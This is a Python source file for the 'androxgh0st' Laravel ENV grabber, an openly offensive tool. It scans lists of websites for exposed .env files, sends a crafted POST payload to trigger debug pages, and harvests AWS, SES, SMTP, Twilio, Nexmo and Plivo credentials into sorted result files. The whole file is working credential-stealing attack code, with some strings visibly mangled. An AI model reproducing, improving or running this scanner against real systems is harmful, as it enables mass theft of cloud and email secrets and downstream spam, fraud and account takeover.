# -*- coding: utf-8 -*-
import requests, os, sys,colorama
colorama.init(autoreset=True)
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from configparser import ConfigParser
from queue import Queue

try:
	os.mkdir('Results')
except:
	pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception as e: print(e)
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

class androxgh0st:
	def nexmo(self, text, url):
		if "NEXMO_KEY" in text:
			save = open('Results/nexmo.txt','a')
			save.write(url+'\
')
			save.close()
			return True
		else:
			return False
			
	def plivo(self, text, url):
		if "PLIVO_AUTH_ID" in text:
			save = open('Results/plivo.txt','a')
			save.write(url+'\
')
			save.close()
			return True
		else:
			return False		

	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break


	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						aws_key = reg("\
AWS_ACCESS_KEY_ID=(.*?)\
", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\
AWS_SECRET_ACCESS_KEY=(.*?)\
", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = ''
					+str(url)+''
					+str(method)+''+str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)+''
					remover = str(build).replace('\'', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\
\
')
					save.close()
					remover = str(build).replace('\'', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\
\
')
					save2.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\
AWS_KEY=(.*?)\
", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\
AWS_SECRET=(.*?)\
", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("\
AWS_BUCKET=(.*?)\
", text)[0]
					except:
						aws_buc = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("<td>AWS_BUCKET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						aws_buc = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build =str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\'', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\
\
')
					save.close()
					remover = str(build).replace('\'', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\
\
')
					save2.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\
SES_KEY=(.*?)\
", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\
SES_SECRET=(.*?)\
", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SES_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SES_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build =str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\'', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\
\
')
					save.close()
					remover = str(build).replace('\'', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\
')
					save2.close()
				return True
			else:
				return False
		except:
			return False

	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\
TWILIO_ACCOUNT_SID=(.*?)\
', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('\
TWILIO_API_KEY=(.*?)\
', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('\
TWILIO_API_SECRET=(.*?)\
', text)[0]
					except:
						sec = ''
					try:
						chatid = reg('\
TWILIO_CHAT_SERVICE_SID=(.*?)\
', text)[0]
					except:
						chatid = ''
					try:
						phone = reg('\
TWILIO_NUMBER=(.*?)\
', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('\
TWILIO_AUTH_TOKEN=(.*?)\
', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('<td>TWILIO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('<td>TWILIO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						sec = ''
					try:
						chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						chatid = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						auhtoken = ''
				build =str(acc_sid)+'|'+str(auhtoken)
				remover = str(build).replace('\'', '')
				save = open('Results/TWILLIO.txt', 'a')
				save.write(remover+'\
\
')
				save.close()
				return True
			else:
				return False
		except:
			return False
			

	def get_smtp(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\
MAIL_HOST=(.*?)\
", text)[0]
					mailport = reg("\
MAIL_PORT=(.*?)\
", text)[0]
					mailuser = reg("\
MAIL_USERNAME=(.*?)\
", text)[0]
					mailpass = reg("\
MAIL_PASSWORD=(.*?)\
", text)[0]
					try:
						mailfrom = reg("\
MAIL_FROM_ADDRESS=(.*?)\
", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg("\\MAIL_FROM_NAME=(.*?)\
", text)[0]
					except:
						fromname = ''
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					try:
						mailfrom = reg("<td>MAIL_FROM_ADDRESS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg("<td>MAIL_FROM_NAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
					except:
						fromname = ''
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					# mod aws
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
						remover = str(build).replace('\'', '')
						save2 = open('Results/smtp_aws.txt', 'a')
						save2.write(remover+'\
\
')
						save2.close()
					elif 'sendgrid' in mailhost:
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/sendgrid.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
					elif 'office365' in mailhost:
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/office.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
					elif '1and1' in mailhost or '1und1' in mailhost:
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/1and1.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
					elif 'zoho' in mailhost:
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/zoho.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
					elif 'mandrillapp' in mailhost:
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/mandrill.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
					elif 'mailgun' in mailhost:
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/mailgun.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
					else:
						build = 'URL: '+str(url)+'\
METHOD: '+str(method)+'\
MAILHOST: '+str(mailhost)+'\
MAILPORT: '+str(mailport)+'\
MAILUSER: '+str(mailuser)+'\
MAILPASS: '+str(mailpass)+'\
MAILFROM: '+str(mailfrom)+'\
FROMNAME: '+str(fromname)
						remover = str(build).replace('\'', '')
						save = open('Results/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\
\
')
						save.close()
					return True
			else:
				return False
		except:
			return False

def printf(text):
	''.join([str(item) for item in text])
	print((text + '\
'), end=' ')

def main(url):
	resp = False
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
		if resp:
			getsmtp = androxgh0st().get_smtp(resp, url)
			getwtilio = androxgh0st().get_twillio(resp, url)
			nexmo = androxgh0st().nexmo(resp, url)
			getaws = androxgh0st().get_aws_data(resp, url)
			plivo = androxgh0st().plivo(resp, url)
			if nexmo:
				text += ' | \033[32;1mNEXMO\033[0m'
			else:
				text += ' | \033[31;1mNEXMO\033[0m'
			if getsmtp:
				text += ' | \033[32;1mSMTP\033[0m'
			else:
				text += ' | \033[31;1mSMTP\033[0m'
			if getaws:
				text += ' | \033[32;1mAWS\033[0m'
			else:
				text += ' | \033[31;1mAWS\033[0m'
			if getwtilio:
				text += ' | \033[32;1mTWILIO\033[0m'
			else:
				text += ' | \033[31;1mTWILIO\033[0m'
			if plivo:
				text += ' | \033[32;1mPLIVO\033[0m'
			else:
				text += ' | \033[31;1mPLIVO\033[0m'
		else:
			text += ' | \033[31;1mCan\'t get everything\033[0m\n'
			save = open('Results/not_vulnerable.txt','a')
			asu = str(url).replace('\'', '')
			save.write(asu+'\
')
			save.close()
	except:
		text = '\033[31;1m#\033[0m '+url
		text += ' | \033[31;1mCan\'t access sites\033[0m\n'
		save = open('Results/not_vulnerable.txt','a')
		asu = str(url).replace('\'', '')
		save.write(asu+'\
')
		save.close()
	printf(text)


if __name__ == '__main__':
	print('''
  _____  _  _____
(___  \\( )/  ___)
  (___ | | ___)
   /")`| |'("\\  SMTP
  | |  | |  | | NEXMO
   \\ \\_| |_/ /  TWILIO
    `._!' _.'   PAYPAL
      / .'\\     AWSKEY
     | / | |    PLIVO
      \\|/ /     \033[32;1mLARAVEL ENV GRABBER\033[0m
       /.<
      (| |)
       | '
       | |
       `-'  \
''')
	try:
		readcfg = ConfigParser()
		readcfg.read(pid_restore)
		lists = readcfg.get('DB', 'FILES')
		numthread = readcfg.get('DB', 'THREAD')
		sessi = readcfg.get('DB', 'SESSION')
		print("log session bot found! restore session")
		print(('''Using Configuration :\
\	FILES='''+lists+'''\
\	THREAD='''+numthread+'''\
\	SESSION='''+sessi))
		tanya = input("Want to contineu session ? [Y/n] ")
		if "Y" in tanya or "y" in tanya:
			lerr = open(lists).read().split("\
"+sessi)[1]
			readsplit = lerr.splitlines()
		else:
			kntl # Send Error Biar Lanjut Ke Wxception :v
	except:
		try:
			lists = sys.argv[1]
			numthread = sys.argv[2]
			readsplit = open(lists).read().splitlines()
		except:
			try:
				lists = input("Enter list~> ")
				readsplit = open(lists).read().splitlines()
			except:
				print("Wrong input or list not found!")
				exit()
			try:
				numthread = input("Threads ->")
			except:
				print("Wrong thread number!")
				exit()
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			pool.add_task(main, url)
		except KeyboardInterrupt:
			session = open(pid_restore, 'w')
			cfgsession = "[DB]\
FILES="+lists+"\
THREAD="+str(numthread)+"\
SESSION="+jagases+"\
"
			session.write(cfgsession)
			session.close()
			print("CTRL+C Detect, Session saved")
			exit()
	pool.wait_completion()
	try:
		os.remove(pid_restore)
	except:
		pass
